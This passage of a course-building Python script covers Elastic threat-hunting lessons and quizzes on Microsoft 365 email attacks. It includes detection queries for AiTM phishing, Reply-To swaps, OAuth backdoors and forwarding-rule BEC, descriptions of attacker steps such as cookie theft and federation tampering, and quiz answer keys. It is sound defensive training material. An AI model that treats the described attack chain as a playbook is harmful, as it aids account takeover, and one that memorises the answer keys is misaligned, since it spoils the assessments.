        stem_md="The capstone hunt's *Q4 process-attribution* step uses an **EQL `sequence by host.name, process.entity_id with maxspan=5m`** that pairs an unsigned-binary process-start event with an outbound network-connection event from the same process — joining the network-side hunt to the host-side process tree to give triage-grade context.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** The L2's signature capstone shape: ES|QL aggregates per-host beacon shape on the network side, EQL `sequence` joins the network event to the spawning process via `process.entity_id`. This produces *triage-grade* output — the L2 hands off the hunt with both the destination beacon evidence and the process that initiated it, ready for L1 triage or IR escalation.",
        points=2,
    )

    # ── Module 6 — Email & collaboration: Initial Access ────────────────
    mod6 = _add_module(
        session, course, order=6,
        title="Email & collaboration — Initial Access",
        description_md=(
            "Hunting on the email + collaboration plane. The Office 365 "
            "Unified Audit Log surface (`logs-microsoft_o365.audit-*`); "
            "**T1566 Phishing** sub-techniques (.001 attachment, .002 "
            "link, .003 via service, .004 voice) and the email-side "
            "fingerprints; **email authentication** (SPF / DKIM / DMARC "
            "/ ARC / SRS / compauth) and the Reply-To swap signal; "
            "post-click + AiTM downstream — T1098 OAuth backdoor, "
            "T1556.006 federation tampering, T1114 email collection, "
            "T1213 SharePoint / Teams / Atlassian mass-pull, T1534 "
            "internal spear phishing, T1027.006 HTML smuggling on the "
            "email side; statistical hunts (rare-sender / attachment-"
            "hash / subject-burst / DMARC fail-rate / mailbox-rule "
            "create-rate / MailItemsAccessed cluster); worked PEAK "
            "capstone — *AiTM phishing → cookie theft → mass mailbox "
            "forwarding rule + SharePoint exfil* — ending in a Kibana "
            "Security EQL detection-rule body."
        ),
        estimated_minutes=240,
    )

    # Lesson 6.1 — Email + collaboration data plane + ECS reference
    m6l1 = _add_lesson(
        session, mod6, order=1,
        title="The email + collaboration data plane in Elastic and the ECS email field reference",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Recognise the **Office 365 Unified Audit Log** surface in `logs-microsoft_o365.audit-*` and the workloads it covers (Exchange / SharePoint / OneDrive / Teams / Entra)
> 2. Map the **operation names** an L2 hunts daily — `Send`, `MailItemsAccessed`, `New-InboxRule`, `Set-Mailbox`, `FileDownloaded`, `SearchQueryPerformed`, `Add-MailboxPermission`
> 3. Read the **ECS `email.*` field reference** (added in 8.6) — `email.subject`, `email.from.address`, `email.to.address`, `email.message_id`, `email.attachments.file.*`
> 4. Pivot between O365 audit, Entra sign-in, and Entra audit indices for a single user-takeover hunt
> 5. Apply broad-to-narrow KQL → EQL → ES|QL on a single email-plane hunt
>
> **Prerequisites.** L2 Modules 1–5 (with M4 in particular for the Entra `session_id` AiTM pattern recapped here).

## The Office 365 Unified Audit Log surface

`logs-microsoft_o365.audit-*` is the single index pattern that carries every audit event across the Microsoft 365 estate: Exchange (mailbox + transport), SharePoint, OneDrive, Microsoft Teams, Entra ID admin actions, Power BI, and a handful of smaller workloads. The L2 filter discriminator is `o365.audit.Workload`:

| Workload | Covers |
|---|---|
| `Exchange` | `Send`, `MailItemsAccessed`, `New-InboxRule`, `Set-Mailbox`, `Add-MailboxPermission`, mail-flow rules |
| `SharePoint` | `FileDownloaded`, `FileAccessed`, `FileUploaded`, `SharingSet`, `PageViewed` |
| `OneDrive` | Same shape as SharePoint, but for the personal OneDrive surface |
| `MicrosoftTeams` | `MessageSent`, `MessageRead`, `MeetingDetail`, `MemberAdded`, `ChannelAdded` |
| `AzureActiveDirectory` | Mirror of `logs-azure.auditlogs-*` for consent / role / app changes |
| `SecurityComplianceCenter` | `SearchQueryPerformed` (eDiscovery / Compliance Search) |

The L2's reflex for any user-takeover hunt: filter to `event.dataset: \"o365.audit\"` and pivot on `o365.audit.Operation` for the action verb.

## Operation names an L2 hunts daily

| Operation | What it captures | Hunt value |
|---|---|---|
| **`Send`** | Outbound mail send (Exchange) | Spear-phishing internal-from-internal (T1534) |
| **`MailItemsAccessed`** | Mailbox content accessed via API or sync | T1114.002 remote email collection — *page-IR* if clustered post-AiTM |
| **`New-InboxRule`** / **`Set-InboxRule`** | Inbox-rule create / modify | T1114.003 — finance-keyword rules are the BEC fingerprint |
| **`Set-Mailbox -ForwardingSmtpAddress`** | Mailbox-level forwarding to attacker | T1114.003 / forwarding-rule persistence |
| **`Add-MailboxPermission`** | Granting Full Access / Send-As | T1098 / mailbox-permission backdoor |
| **`Add-MailboxFolderPermission`** | Folder-level share | Exfil via shared folder |
| **`Add service principal credentials`** | OAuth client secret / cert added to a service principal | **T1098.001** — *page-IR* if non-admin actor |
| **`Consent to application`** | User accepted an OAuth consent prompt | T1528 / OAuth-grant abuse |
| **`Add member to role`** | Role assignment (`Global Administrator`, `Privileged Role Administrator`) | T1098.003 — *page-IR* signal |
| **`FileDownloaded`** | SharePoint / OneDrive file download | T1213 mass-pull cluster |
| **`SharingSet`** | External SharePoint share created | Data exfil via external link |
| **`MessageSent`** | Teams chat message | T1534 / external-Teams-DM phishing |
| **`SearchQueryPerformed`** | Compliance Search / eDiscovery | Adversary searching the tenant for sensitive content |
| **`MessageTrace`** | Mail-flow trace lookup | Recon-by-attacker (rare in normal ops) |
| **`Set domain authentication`** / **`Set federation settings on domain`** | Domain federation change | **T1556.006 — *page-IR* signal** |

KQL for a *fast* O365-audit pivot:

```kql
event.dataset: "o365.audit"
  and o365.audit.Workload: "Exchange"
  and o365.audit.Operation: ("New-InboxRule" or "Set-InboxRule")
```

## ECS email field reference

ECS added the `email.*` namespace in 8.6. The L2's working set:

| Field | Carries |
|---|---|
| `email.subject` | Message subject |
| `email.from.address` | RFC 5322 header From |
| `email.to.address` / `email.cc.address` / `email.bcc.address` | Recipients |
| `email.reply_to.address` | Reply-To header — the swap signal |
| `email.sender.address` | RFC 5321 envelope sender |
| `email.message_id` | RFC 5322 Message-ID |
| `email.delivery_timestamp` | Hand-off to recipient mailbox |
| `email.direction` | `inbound` / `outbound` |
| `email.local_id` | The exchange-side ID for the message |
| `email.attachments.file.name` | Attachment filename |
| `email.attachments.file.hash.sha256` | Attachment hash — primary IOC |
| `email.attachments.file.size` | Bytes |
| `email.attachments.file.mime_type` | MIME type |

For deployments still on pre-8.6 schema, equivalent fields surface under `winlogbeat-msexchange-*` or vendor-specific paths (Mimecast / Proofpoint integration field names). Confirm the schema version on the target estate before pinning a hunt to specific paths.

## Third-party gateway integrations — recognise but don't pin

| Gateway | Elastic integration | Notes |
|---|---|---|
| **Mimecast** | `logs-mimecast.*` | TTP / URL Protect / Attachment Protect logs |
| **Proofpoint** | `logs-proofpoint_tap.*` | TAP / TRAP — auto-pull events |
| **Cisco IronPort / SEG** | `logs-cisco_ironport.*` | Mail-flow + decisions |
| **Barracuda / Trend / Sophos** | varies | Estate-specific |
| **Abnormal Security** | `logs-abnormal_security.*` | ML-based gateway |
| **Cofense / KnowBe4** | varies | User-reported phish workflow |

The L2 should hunt against whichever gateway integration is wired in the estate; the *patterns* (phishing fingerprint, header analysis, URL reputation) are the same — only the field paths shift.

## Cross-source pivot — the user-takeover hunt

A single user takeover crosses three indices:

```mermaid
flowchart LR
    SI[logs-azure.signinlogs-*<br/>risk + session_id reuse] --> AD[logs-azure.auditlogs-*<br/>OAuth consent / role grant]
    AD --> O3[logs-microsoft_o365.audit-*<br/>inbox rule + MailItemsAccessed<br/>+ FileDownloaded]
```

ES|QL multi-index pivot keyed on `user.target.name` or the M4 UPN field:

```esql
FROM logs-azure.signinlogs-*, logs-azure.auditlogs-*, logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 24h
  AND (user.name == "alex@corp.example"
       OR user.target.name == "alex@corp.example"
       OR azure.signinlogs.properties.user_principal_name == "alex@corp.example")
| KEEP @timestamp, event.dataset, event.action,
       azure.signinlogs.properties.risk_level_during_sign_in,
       azure.auditlogs.operation_name,
       o365.audit.Operation,
       o365.audit.Workload
| SORT @timestamp ASC
```

This produces a chronological per-user timeline across the three planes — the L2's daily reach for *what happened to this user in the last 24 hours?*

## Worked broad-to-narrow on a single hunt

**Hypothesis.** *In the past 7 days, an adversary has created an inbox rule with finance keywords on a victim mailbox after a high-risk Entra sign-in, observable in `logs-microsoft_o365.audit-*` `New-InboxRule` events with body keywords matching `wire / invoice / swift / payment / remit`.*

**KQL** (Discover):

```kql
event.dataset: "o365.audit"
  and o365.audit.Operation: ("New-InboxRule" or "Set-InboxRule")
  and o365.audit.Parameters: (*invoice* or *wire* or *swift* or *payment* or *remit* or *bank* or *ach*)
```

**ES|QL** aggregation by user (user-fan-out + frequency):

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 7d
  AND event.dataset == "o365.audit"
  AND o365.audit.Operation IN ("New-InboxRule", "Set-InboxRule")
  AND KQL("o365.audit.Parameters: (*invoice* OR *wire* OR *swift* OR *payment* OR *remit*)")
| STATS rule_count = COUNT(),
        rules = VALUES(o365.audit.Parameters)
  BY user.target.name, BUCKET(@timestamp, 1h)
| SORT rule_count DESC
| LIMIT 100
```

**EQL** for the AiTM-then-rule chain joining sign-in to mailbox-rule:

```eql
sequence by user.target.name with maxspan=4h
  [ any where event.dataset == "azure.signinlogs"
          and azure.signinlogs.properties.risk_level_during_sign_in == "high" ]
  [ any where event.dataset == "o365.audit"
          and o365.audit.Operation : ("New-InboxRule", "Set-InboxRule") ]
```

A high-risk sign-in followed within 4 hours by an inbox-rule create from the same UPN is the textbook AiTM-to-BEC pattern.

## Glossary

- **`o365.audit.Workload`** — the discriminator field across Exchange / SharePoint / OneDrive / Teams / Entra audit events.
- **`o365.audit.Operation`** — the action verb (`Send`, `MailItemsAccessed`, `New-InboxRule`, etc.).
- **MailItemsAccessed** — Microsoft 365 audit event for mailbox content access; gated to E5 / A5 / G5 licences.
- **ECS `email.*`** — added in 8.6; older deployments use Winlogbeat / vendor-specific schemas.
- **Cross-source pivot** — `signinlogs` ↔ `auditlogs` ↔ `o365.audit` keyed on UPN.

## Further reading

- Microsoft Learn — *Office 365 Management Activity API audit schema*.
- Elastic docs — *Microsoft 365 integration* (Filebeat / Elastic Agent).
- ECS field reference — `email.*` namespace.
""",
    )
    m6l1q = _add_lesson(
        session, mod6, order=2, title="Email data plane — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the o365.audit Workload+Operation discriminators, MailItemsAccessed licensing, the cross-source UPN pivot, and ECS email.* schema versioning.",
    )
    _add_q(session, m6l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 wants to filter the Office 365 Unified Audit Log to *only* mailbox-rule create / modify events. Which combination of fields is canonical?",
        options=[
            {"value": "kibana", "label": "`event.dataset: \"kibana.alert\"`"},
            {"value": "audit", "label": "`event.dataset: \"o365.audit\" AND o365.audit.Workload: \"Exchange\" AND o365.audit.Operation: (\"New-InboxRule\" OR \"Set-InboxRule\")`"},
            {"value": "azure", "label": "`event.dataset: \"azure.signinlogs\"`"},
            {"value": "winlog", "label": "`event.dataset: \"winlogbeat\"`"},
        ],
        correct="audit",
        explanation_md="The Unified Audit Log lives in `event.dataset: o365.audit`. The Workload (Exchange / SharePoint / Teams / etc.) discriminates between data planes; the Operation is the action verb. `New-InboxRule` and `Set-InboxRule` are the two operations the L2 hunts for the BEC inbox-rule fingerprint.",
        points=2,
    )
    _add_q(session, m6l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following ECS `email.*` fields are core to email-plane hunting (added in ECS 8.6)?",
        options=[
            {"value": "subject", "label": "`email.subject`"},
            {"value": "from", "label": "`email.from.address` (RFC 5322 header From)"},
            {"value": "reply", "label": "`email.reply_to.address` (the Reply-To swap signal)"},
            {"value": "att_hash", "label": "`email.attachments.file.hash.sha256`"},
            {"value": "process_pid", "label": "`process.pid`"},
        ],
        correct=["subject", "from", "reply", "att_hash"],
        explanation_md="The `email.*` namespace covers subject, from, reply-to, attachment hash, message-id, recipients. `process.pid` is from the process-event namespace (M3) — completely unrelated to the email plane.",
        points=3,
    )
    _add_q(session, m6l1q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="The Microsoft 365 `MailItemsAccessed` audit event — used to detect T1114.002 Remote Email Collection — is **gated to E5 / A5 / G5 licences only**, so its presence (or absence) on a given tenant depends on the licensing tier and the L2 should confirm coverage before authoring hunts that depend on it.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** `MailItemsAccessed` is part of Microsoft Purview Audit (Premium), which requires E5 / A5 / G5 (or the standalone Audit Premium add-on). Lower-SKU tenants don't emit this event at all — the L2 must use alternative signals (mailbox-rule create-rate spikes, OAuth grant additions, sign-in risk + Mailbox forwarding) for the same hunt class on lower SKUs.",
        points=2,
    )
    _add_q(session, m6l1q, order=4, kind=QuestionKind.SINGLE,
        stem_md="An L2 wants to build a *user-timeline* hunt across Entra sign-in, Entra audit, and the Office 365 Unified Audit Log for one suspect UPN. Which ES|QL pattern is correct?",
        options=[
            {"value": "single_index", "label": "Query only `logs-microsoft_o365.audit-*`"},
            {"value": "multi", "label": "`FROM logs-azure.signinlogs-*, logs-azure.auditlogs-*, logs-microsoft_o365.audit-*` with a UPN filter that matches across all three (`user.name`, `user.target.name`, `azure.signinlogs.properties.user_principal_name`)"},
            {"value": "kql_only", "label": "Run three separate KQL searches and manually correlate"},
            {"value": "join", "label": "`FROM logs-azure.signinlogs-* | LOOKUP JOIN logs-microsoft_o365.audit-*`"},
        ],
        correct="multi",
        explanation_md="ES|QL multi-index `FROM` is first-class. The three indices use slightly different UPN field paths (`user.name` in O365 audit, `user.target.name` in Entra audit, `azure.signinlogs.properties.user_principal_name` in sign-in logs), so a robust filter ORs all three. The result is a chronological per-user timeline across the three planes.",
        points=2,
    )

    # Lesson 6.2 — T1566 Phishing sub-techniques + email-side hunts
    m6l2 = _add_lesson(
        session, mod6, order=3,
        title="T1566 Phishing — sub-techniques and email-side hunts",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Distinguish **T1566.001** Spearphishing Attachment (file delivery), **.002** Spearphishing Link (URL delivery), **.003** Spearphishing via Service (LinkedIn / Teams / Discord), **.004** Spearphishing Voice (vishing)
> 2. Recognise **T1027.006 HTML Smuggling** as it surfaces in email-side telemetry
> 3. Read **email-authentication results** (SPF / DKIM / DMARC / ARC / SRS / compauth) and the *Reply-To swap* signal
> 4. Hunt **lookalike domain** patterns and **AiTM kit per-recipient tokens** in URL paths
> 5. Catch **legacy authentication** post-AiTM and **OAuth-consent-prompt URL** patterns

## T1566.001 Spearphishing Attachment

File-delivery phishing — payloads ride as email attachments. The L2's first cut is the *risky-extension* filter against `email.attachments.file.extension` or `email.attachments.file.mime_type`:

```kql
event.dataset: "o365.audit"
  and o365.audit.Operation: "Send"
  and email.direction: "inbound"
  and email.attachments.file.extension: ("html" or "htm" or "iso" or "img" or "vhd" or "vhdx"
                                          or "lnk" or "one" or "svg" or "xll" or "appref-ms"
                                          or "url" or "website" or "appx" or "msix")
```

Each extension maps to a documented evasion technique covered in L1 Module 6 — HTML smuggling on `.html`, MOTW-bypass containers on `.iso`/`.img`/`.vhd`, OneNote embedding on `.one`, LNK-with-cmdline on `.lnk`, SVG-with-script on `.svg`. The L2 hunts the cluster, not any single extension.

### T1027.006 HTML Smuggling specifically

JavaScript inside an email-attached HTML file reconstructs a binary payload from a base64 blob, evading email-gateway scanners that scan body text but not embedded blobs. The email-side fingerprint:

```esql
FROM logs-microsoft_o365.audit-*, logs-mimecast-*, logs-proofpoint_tap-*
| WHERE @timestamp > NOW() - 7d
  AND email.attachments.file.mime_type IN ("text/html", "application/octet-stream")
  AND email.attachments.file.size > 100000
| KEEP @timestamp, email.from.address, email.to.address,
       email.subject, email.attachments.file.name,
       email.attachments.file.size, email.attachments.file.hash.sha256
| LIMIT 200
```

A 100 KB+ HTML attachment is unusual for legitimate mail; pair with hash-novelty to catch the smuggling pattern.

## T1566.002 Spearphishing Link

URL-delivery phishing. The L2's hunt classes:

- **Lookalike-domain links** — `mlcrosoft-update.com` / `office365-secure.net` / IDN homoglyphs (`acmе.com`).
- **OAuth-consent-prompt URLs** — `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?...&client_id=<unfamiliar-app>&scope=Mail.ReadWrite ...`. Catch via URL-pattern + OAuth-scope analysis.
- **AiTM kit URLs** — kits like Tycoon / EvilProxy / Mamba 2FA / NakedPages / Caffeine encode a *per-recipient token* in the URL path or query string (`?id=USER-A1B2`, `/auth/<token>`). The token *survives mail-gateway URL rewriting* on most gateways.

KQL for AiTM kit per-recipient-token URL patterns:

```kql
event.dataset: "o365.audit"
  and o365.audit.Workload: "Exchange"
  and email.direction: "inbound"
  and url.full: (*?rid=*-* or *?id=*-* or *?vid=* or */auth/*)
  and url.domain: (*.azurewebsites.net or *.workers.dev or *.r2.dev or *.web.app)
```

The combination of *cloud-hosted domain* + *per-recipient-looking token* in the URL is the AiTM-kit signature. Detection from the email-side beats waiting for the post-click sign-in.

## T1566.003 Spearphishing via Service

LinkedIn DM, Teams external chat, Discord, freemail. The Microsoft 365 telemetry:

```kql
event.dataset: "o365.audit"
  and o365.audit.Workload: "MicrosoftTeams"
  and o365.audit.Operation: "MessageSent"
  and o365.audit.UserId: *external*
```

Tenant-allowed external Teams chat is a growing attack surface. Hunt for Teams messages from external users containing URL patterns matching the T1566.002 lookalike list above.

## T1566.004 Spearphishing Voice

Voice phishing (vishing) — the L2 rarely triages this directly from email telemetry; the downstream effect surfaces as user-reported password resets / MFA registrations / suspicious sign-ins (Module 4 surface).

## Email authentication — SPF / DKIM / DMARC / ARC / SRS / compauth

Most mail integrations normalise authentication results into a header-derived field. In Microsoft 365 the L2 reads `o365.audit.Headers` (or the gateway-specific equivalent) for:

- **SPF** result — `pass` / `fail` / `softfail` / `neutral` / `none`. Fail isn't deterministic (forwarding breaks SPF) but a fail cluster from one sender is signal.
- **DKIM** signature verification — `pass` / `fail` / `none`. Pair with the `d=` signing domain.
- **DMARC** verdict — `pass` / `fail` with the policy applied (`reject` / `quarantine` / `none`). DMARC fails that landed in the inbox indicate either tenant Allow-list abuse or ARC-trusted forwarding.
- **ARC chain** — relevant for forwarded mail; the receiving server seals the original auth result so downstream hops can still trust it.
- **SRS** — Sender Rewriting Scheme; mailing-list / forwarder envelope rewriting. Rare but handy to recognise.
- **compauth** — Microsoft's *composite authentication* result combining SPF / DKIM / DMARC. The single field that tells the L2 *did this message authenticate end to end*.

Hunt for DMARC fails that *landed in the inbox* (i.e. tenant Allow-list let through):

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 24h
  AND email.direction == "inbound"
  AND KQL("(authentication_results: *dmarc=fail* OR compauth: *fail*) AND NOT delivery_action: \"Quarantine\"")
| STATS count = COUNT() BY email.from.address, email.subject
| SORT count DESC
| LIMIT 100
```

## The Reply-To swap signal

A header where the visible `From` address differs from the `Reply-To` address. Auth on the `From` passes (SPF/DKIM/DMARC for the legitimate-looking domain), and the conversation gets diverted to the attacker-controlled Reply-To on the user's reply.

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 7d
  AND email.direction == "inbound"
  AND email.from.address IS NOT NULL
  AND email.reply_to.address IS NOT NULL
  AND email.from.address != email.reply_to.address
| EVAL from_domain = SPLIT(email.from.address, "@")[1]
| EVAL reply_domain = SPLIT(email.reply_to.address, "@")[1]
| WHERE from_domain != reply_domain
| KEEP @timestamp, email.from.address, email.reply_to.address, email.subject
| LIMIT 200
```

`From: ceo@yourcorp.com` + `Reply-To: ceo.private@gmail.com` is the textbook BEC fingerprint — and *passes auth* on the `From` because the attacker controls the apparent-CEO domain spoof at the visible-From layer separately.

## Lookalike-domain detection

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 7d
  AND email.direction == "inbound"
  AND email.from.address IS NOT NULL
| EVAL from_domain = SPLIT(email.from.address, "@")[1]
| WHERE from_domain LIKE "%microsoft%"
   OR from_domain LIKE "%office365%"
   OR from_domain LIKE "%adobe%"
   OR from_domain LIKE "%docusign%"
   OR from_domain LIKE "%sharepoint%"
| WHERE NOT from_domain IN ("microsoft.com", "outlook.com", "office.com",
                              "office365.com", "sharepoint.com", "onmicrosoft.com",
                              "adobe.com", "docusign.com", "docusign.net")
| STATS count = COUNT() BY from_domain
| SORT count DESC
| LIMIT 100
```

The pattern: domain *contains* a brand string (`microsoft` / `adobe` / `docusign`) but isn't on the legitimate-domain whitelist. Catches typosquats (`mlcrosoft-update.com`) and combosquats (`microsoft-login-portal.io`).

## Display-name vs domain mismatch

`From: "Microsoft 365 Security Team" <noreply@account-security-portal.xyz>`. The display name claims a brand; the domain is unrelated. Detection:

```esql
FROM logs-microsoft_o365.audit-*
| WHERE @timestamp > NOW() - 7d
  AND email.direction == "inbound"
  AND email.from.name IS NOT NULL
  AND email.from.address IS NOT NULL
| EVAL from_domain = SPLIT(email.from.address, "@")[1]
| WHERE (email.from.name LIKE "%Microsoft%" AND NOT from_domain LIKE "%microsoft%")
   OR (email.from.name LIKE "%Adobe%" AND NOT from_domain LIKE "%adobe%")
   OR (email.from.name LIKE "%DocuSign%" AND NOT from_domain LIKE "%docusign%")
| KEEP @timestamp, email.from.name, email.from.address, email.subject
| LIMIT 200
```

## Legacy authentication post-AiTM

(M4 callback.) Once AiTM has captured a session cookie, the attacker may pivot to legacy-auth protocols (IMAP4 / POP3 / Authenticated SMTP / *Other clients*) which bypass MFA at the protocol level. Hunt for *successful* legacy-auth sign-ins for users who normally use modern auth:

```kql
event.dataset: "azure.signinlogs"
  and azure.signinlogs.properties.client_app_used: ("IMAP4" or "POP3" or "Authenticated SMTP" or "Other clients")
  and azure.signinlogs.properties.status.error_code: 0
```

## Glossary

- **T1566 sub-techniques** — .001 attachment / .002 link / .003 service / .004 voice.
- **AiTM kit per-recipient token** — `?id=USER-XXXX` / `?rid=*-*` URL patterns; survives gateway URL rewriting.
- **compauth** — Microsoft's composite auth result combining SPF / DKIM / DMARC.
- **Reply-To swap** — visible From and Reply-To diverge; BEC fingerprint that passes auth on From.

## Further reading

- Microsoft Learn — *Anti-spam message headers* (compauth reasons).
- Elastic docs — *Microsoft 365 integration* event reference.
- ATT&CK technique pages T1566 + sub-techniques + T1027.006.
""",
    )
    m6l2q = _add_lesson(
        session, mod6, order=4, title="T1566 phishing — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the AiTM-kit per-recipient-token URL fingerprint, the Reply-To swap signal, DMARC fail bypassing tenant Allow-list, and the legacy-auth post-AiTM signal.",
    )
    _add_q(session, m6l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 hunts for **AiTM-kit phishing URLs** in inbound mail. Which URL-pattern combination is the strongest fingerprint?",
        options=[
            {"value": "any_https", "label": "Any HTTPS URL"},
            {"value": "kit_token", "label": "URL with a *per-recipient token* in the path or query (`?id=USER-A1B2`, `?rid=*-*`, `/auth/<token>`) hosted on a cloud-fronted domain (`*.azurewebsites.net`, `*.workers.dev`, `*.r2.dev`, `*.web.app`)"},
            {"value": "att_only", "label": "Any URL with an attachment"},
            {"value": "external", "label": "Any external sender"},
        ],
        correct="kit_token",
        explanation_md="AiTM kits encode a per-recipient token in the URL because the kit needs to know which victim's session it's relaying. The token survives gateway URL rewriting on most gateways, and the cloud-fronted domain provides cheap, ephemeral hosting. The *combination* — token + cloud-front — is the kit fingerprint. Catching this on the email-side beats waiting for the post-click sign-in.",
        points=2,
    )
    _add_q(session, m6l2q, order=2, kind=QuestionKind.SHORTANSWER,
        stem_md="A header pattern where `email.from.address` is `ceo@corp.example` (visible From, passes SPF / DKIM / DMARC) and `email.reply_to.address` is `ceo.private@gmail.com` (different domain entirely) is the textbook fingerprint of which BEC technique? (Two or three words.)",
        options=None,
        correct=["reply-to swap", "reply to swap", "reply-to mismatch", "reply to mismatch"],
        explanation_md="**Reply-To swap.** The visible From passes auth (attacker controls a separate spoof or the email source legitimately authenticates), but the conversation gets diverted to the attacker-controlled Reply-To on the user's *reply*. Catches a class of BEC that *passes all three of SPF/DKIM/DMARC* on the From and is therefore not blockable by auth-only filtering.",
        points=2,
    )
    _add_q(session, m6l2q, order=3, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *valid* email-authentication-result patterns the L2 should hunt as suspicious in inbound mail?",
        options=[
            {"value": "dmarc_fail", "label": "DMARC `fail` that *landed in the inbox* (not Quarantine) — indicates tenant Allow-list bypass or ARC-trusted forwarding"},
            {"value": "compauth_fail", "label": "Microsoft `compauth: fail` (composite auth fail combining SPF / DKIM / DMARC)"},
            {"value": "spf_softfail_cluster", "label": "SPF `softfail` cluster from one sending IP across many recipients"},
            {"value": "dkim_pass", "label": "DKIM `pass` with the signing-domain `d=` matching the visible From"},
            {"value": "dmarc_pass", "label": "DMARC `pass`"},
        ],
        correct=["dmarc_fail", "compauth_fail", "spf_softfail_cluster"],
        explanation_md="DMARC fail, compauth fail, and SPF softfail clusters are anomaly signals. DKIM pass with `d=` matching From and DMARC pass are *normal* — exactly what legitimate authenticated mail produces. Hunting for those would be inverted; the L2 hunts *failures* that landed despite policy.",
        points=3,
    )
    _add_q(session, m6l2q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="Even on a tenant where MFA is enforced for all users, a successful sign-in with `azure.signinlogs.properties.client_app_used == \"IMAP4\"` (or `POP3`, `Authenticated SMTP`, `Other clients`) is *especially* suspicious because legacy auth protocols bypass MFA at the protocol level — and this is a frequent post-AiTM persistence pattern on tenants that haven't fully disabled legacy auth.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** Legacy auth (IMAP4 / POP3 / Authenticated SMTP / Other clients) bypasses MFA at the protocol level. Microsoft has deprecated basic auth for most of these but estate coverage remains mixed. On an MFA-enforced tenant, a *successful* legacy-auth sign-in is either a configuration gap an attacker is exploiting, or post-AiTM persistence. Either way, page IR-grade signal.",
        points=2,
    )

    # Lesson 6.3 — Post-click + AiTM downstream + collaboration hunts
    m6l3 = _add_lesson(
        session, mod6, order=5,
        title="Post-click and AiTM downstream + collaboration-platform hunts",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Recap the **AiTM `session_id` reuse** pattern from Module 4 and join it to **post-takeover** O365 audit signals
> 2. Hunt **T1098** account-manipulation tradecraft — .001 OAuth credential addition, .003 cloud-role grant, .005 device registration
> 3. Recognise **T1556.006** Domain Federation Settings tampering as a *page-IR* Golden-SAML-prep signal
> 4. Hunt **T1114** Email Collection — .003 forwarding rules with finance keywords, .002 MailItemsAccessed clusters
> 5. Detect **T1213** SharePoint / Teams / OneDrive mass-pull and **T1534** Internal Spear Phishing

## Recap — the AiTM downstream chain (M4 → M6)

The Module 4 capstone established the AiTM session-cookie reuse signal. M6 extends that hunt with the *post-takeover* tradecraft an L2 sees on the O365 plane:

```mermaid
flowchart LR
    A[Phishing click<br/>T1566.002] --> B[AiTM cookie theft<br/>T1539]
    B --> C[Cloud sign-in<br/>session_id reuse<br/>T1078.004]
    C --> D[Device registration<br/>T1098.005]
    D --> E[OAuth secret added<br/>T1098.001]
    E --> F[Cloud role added<br/>T1098.003]
    F --> G[Inbox rule + forwarding<br/>T1114.003]
    G --> H[SharePoint mass pull<br/>T1213]
    H --> I[Exfil to cloud storage<br/>T1567.002]
```

Each stage produces a discrete audit event. The L2's daily reach is the *kill-chain* — recognising stages 1–4 lets the analyst escalate before stages 7–9 happen.

## T1098 — Account Manipulation post-takeover

### .001 Additional Cloud Credentials — OAuth backdoor

Adversary adds an OAuth client secret or certificate to a service principal, establishing tenant-wide persistence independent of any user account.

```esql
FROM logs-azure.auditlogs-*
| WHERE @timestamp > NOW() - 7d
  AND azure.auditlogs.operation_name IN ("Update application – Certificates and secrets management",
                                          "Add service principal credentials",
                                          "Add owner to service principal")
| STATS event_count = COUNT(),
        actors = VALUES(azure.auditlogs.properties.initiated_by.user.user_principal_name),
        targets = VALUES(azure.auditlogs.properties.target_resources)
  BY azure.auditlogs.properties.target_resources, BUCKET(@timestamp, 1h)
| SORT event_count DESC
| LIMIT 100
```

A *non-admin actor* adding credentials to a high-privilege app like `Microsoft Graph PowerShell` is *page-IR*.

### .003 Additional Cloud Roles

Granting Global Administrator / Privileged Role Administrator / Application Administrator. Always page-IR-grade outside documented change windows.

```kql
event.dataset: "azure.auditlogs"
  and azure.auditlogs.operation_name: ("Add member to role"
                                        or "Add eligible member to role"
                                        or "Add role assignment to role definition")
  and azure.auditlogs.properties.target_resources: ("Global Administrator"
                                                      or "Privileged Role Administrator"
                                                      or "Application Administrator"
                                                      or "Cloud Application Administrator")
```

### .005 Device Registration — compliant-device CA bypass

After AiTM cookie theft, the attacker registers their own device in Entra ID, satisfying compliant-device Conditional Access policies. Recognise as the *AiTM finisher*.

```kql
event.dataset: "azure.auditlogs"
  and azure.auditlogs.operation_name: ("Add device" or "Add registered users to device")
```

Pair with M4's `session_id` reuse signal — a registration event from the same UPN that just had AiTM-fingerprint sign-in is the high-confidence pattern.

## T1556.006 Domain Federation Settings — Golden SAML preparation

Adding a rogue federated domain or trust enables tenant-wide *Golden SAML* persistence — sign tokens with a stolen ADFS / token-signing key. **Always page-IR.**

```kql
event.dataset: "azure.auditlogs"
  and azure.auditlogs.operation_name: ("Set domain authentication"
                                        or "Set federation settings on domain"
                                        or "Update domain")
```

The hunt is *trivial* but the disposition is severe — federation-settings changes are extremely rare in normal ops (usually once a year, with a documented change ticket). Unattributed = page IR.

## T1114 Email Collection

### .003 Email Forwarding Rule — the BEC fingerprint

